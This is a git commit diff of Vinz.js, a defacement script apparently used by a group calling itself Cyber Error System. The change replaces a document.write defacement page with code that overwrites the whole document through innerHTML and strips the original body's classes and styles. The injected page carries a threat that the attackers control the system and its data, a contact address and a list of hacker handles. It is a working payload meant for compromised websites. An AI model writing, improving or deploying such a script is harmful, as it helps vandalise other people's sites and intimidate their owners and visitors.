9f1917e0b14cad8a84c8cfd774c9f02f7fa7383b
VinzSec1337 <vinzroot128@gmail.com>
2026-04-04 02:18:14 +0700

    Vinz.js

--- Vinz.js
+++ Vinz.js
@@ -1,9 +1,9 @@
-/* [ VINZXPLOIT JSO STAMPED V2 ] 
-   Vibes: Shaking Effect + Audio Autoplay
-   Source: Cyber Error System
+/* [ VINZXPLOIT OMEGA JSO - FULL INDEX V3 ] 
+   Vibes: Total Wipeout & Hijack
 */
 
-document.write(`
+(function() {
+    var defaceContent = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -12,56 +12,48 @@ document.write(`
     <link rel="icon" type="image/jpg" href="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans+Narrow|Just+Another+Hand" />
 <style>
-  body { text-align: center; background-color: black; margin: 0; padding: 0; overflow: hidden; }
-  @keyframes shake {
-    0% { transform: translate(1px, 1px) rotate(0deg); }
-    10% { transform: translate(-1px, -2px) rotate(-1deg); }
-    20% { transform: translate(-3px, 0px) rotate(1deg); }
-    30% { transform: translate(3px, 2px) rotate(0deg); }
-    40% { transform: translate(1px, -1px) rotate(1deg); }
-    50% { transform: translate(-1px, 2px) rotate(-1deg); }
-    60% { transform: translate(-3px, 1px) rotate(0deg); }
-    70% { transform: translate(3px, 1px) rotate(-1deg); }
-    80% { transform: translate(-1px, -1px) rotate(1deg); }
-    90% { transform: translate(1px, 2px) rotate(0deg); }
-    100% { transform: translate(1px, -2px) rotate(-1deg); }
-  }
-  .x {
-    animation: shake 5s;
-    animation-iteration-count: infinite;
-    font-family: 'Just Another Hand', cursive;
-    font-size: 58px;
-    color: white;
-    margin-top: 20px;
-  }
-  .z {
-    font-family: 'PT Sans Narrow', cursive;
-    font-size: 18px;
-    color: white;
-    line-height: 1.6;
-  }
-  img { margin-top: 50px; border-radius: 10px; }
+    /* CSS RESET BIAR KAGA TABRAKAN */
+    html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black !important; }
+    body { text-align: center; }
+    @keyframes shake {
+        0% { transform: translate(1px, 1px) rotate(0deg); }
+        10% { transform: translate(-1px, -2px) rotate(-1deg); }
+        20% { transform: translate(-3px, 0px) rotate(1deg); }
+        30% { transform: translate(3px, 2px) rotate(0deg); }
+        40% { transform: translate(1px, -1px) rotate(1deg); }
+        50% { transform: translate(-1px, 2px) rotate(-1deg); }
+        60% { transform: translate(-3px, 1px) rotate(0deg); }
+        70% { transform: translate(3px, 1px) rotate(-1deg); }
+        80% { transform: translate(-1px, -1px) rotate(1deg); }
+        90% { transform: translate(1px, 2px) rotate(0deg); }
+        100% { transform: translate(1px, -2px) rotate(-1deg); }
+    }
+    .x { animation: shake 5s infinite; font-family: 'Just Another Hand', cursive; font-size: 58px; color: white; margin-top: 50px; }
+    .z { font-family: 'PT Sans Narrow', cursive; font-size: 18px; color: white; line-height: 1.6; }
+    img { margin-top: 50px; border-radius: 10px; border: 2px solid white; }
 </style>
 </head>
-<body onclick="playAudio();">
-  <audio id="sec" loop>
-    <source src="https://l.top4top.io/m_33163rb1j0.mp3" type="audio/mpeg">
-  </audio>
-  <script>
-    var x = document.getElementById("sec");
-    function playAudio() { x.play(); }
-  </script>
-  <br><br>
-  <img src="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg" width="250"> 
-  <div class="x">&#8361; Stamped By VinzXploit &#8361;</div><br>
-  <div class="z">
-    <i><strong>We have full control over this system, and any attempts to interfere will be monitored and responded to with stricter<br>measures. Do not take this warning lightly, the safety of your data is now in our hands.</strong></i>
-    <br><br> 
-    Contact Information: JabarCrime@protonmail.com<br><br> 
-    <strong>CYBER ERROR SYSTEM WAS HERE</strong><br>
-    Fakesite - Doys_404 - Anon_lx02 - Fakesec - Iethesia - SukaKamu01 - HanjsXploite - LikeEx01 - VinzXploit - Enter666x - NoFace999 - Lanzz<br>
-    XybaXploite - RommyXploit - Dandier - Xstroven - BigBoy - Amirxploite - Machfood - Fedup_404 - UniCorn - Izunasec - ./GregCyber
-  </div>
+<body onclick="var x=document.getElementById('sec'); x.play();">
+    <audio id="sec" loop><source src="https://l.top4top.io/m_33163rb1j0.mp3" type="audio/mpeg"></audio>
+    <img src="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg" width="250"> 
+    <div class="x">&#8361; Stamped By VinzXploit &#8361;</div><br>
+    <div class="z">
+        <i><strong>We have full control over this system...</strong></i><br><br> 
+        Contact: JabarCrime@protonmail.com<br><br> 
+        <strong>CYBER ERROR SYSTEM WAS HERE</strong><br>
+        Fakesite - Doys_404 - Anon_lx02 - Fakesec - Iethesia - SukaKamu01 - VinzXploit - ./GregCyber
+    </div>
 </body>
 </html>
-`);
+    `;
+
+    // TEKNIK FULL OVERWRITE BRUTAL
+    document.documentElement.innerHTML = defaceContent;
+    
+    // Kadang body aslinya masih punya class/style yang ngganggu, kita hajar paksa:
+    document.body.removeAttribute("class");
+    document.body.removeAttribute("style");
+    document.body.style.backgroundColor = "black";
+    
+    console.log("Full Index Success - VinzXploit");
+})();
